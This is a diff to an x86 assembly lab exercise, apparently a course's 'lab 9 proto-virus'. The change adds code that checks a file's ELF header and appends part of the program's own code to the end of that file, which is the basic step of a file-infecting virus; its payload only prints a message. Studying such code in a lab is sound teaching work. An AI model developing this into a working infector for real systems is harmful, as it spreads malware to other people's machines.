@@ -92,8 +92,15 @@ _start:
     cmp byte[ebp-8+3],'F'; elfmago3
     jne .print_Failstr;
 
+	mov edx, _start.print_OutStr-_start.nopnop
+	lseek dword[ebp-4], 0, SEEK_END ; get to end of file
+	write dword[ebp-4], .print_OutStr, edx ; write the print command
+
+
 	.print_OutStr:
 		print_OutStr
+		.nopnop:
+		close [ebp-4]
 		jmp VirusExit
 	.print_Failstr:
 		print_Failstr
@@ -104,16 +111,22 @@ _start:
 
 
 VirusExit:
+	popad
+	add	esp, STK_RES
+	pop ebp
+
        exit 0            ; Termination if all is OK and no previous code to jump to
                          ; (also an example for use of above macros)
 	
-FileName:	db "ELFexec1", 0
+FileName:	db "ELFexecTestFile", 0
+;FileName:	db "ELFexec1", 0
 OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
 OutStr_len: equ $-OutStr
 Failstr:        db "perhaps not", 10 , 0
 Failstr_len: equ $-Failstr
 OpenErrStr: db "File open fail", 10, 0
 OpenErrStr_len: equ $-OpenErrStr
+print_OutStr_len: equ _start.print_OutStr-_start.nopnop
 
 get_my_loc:
 	call next_i
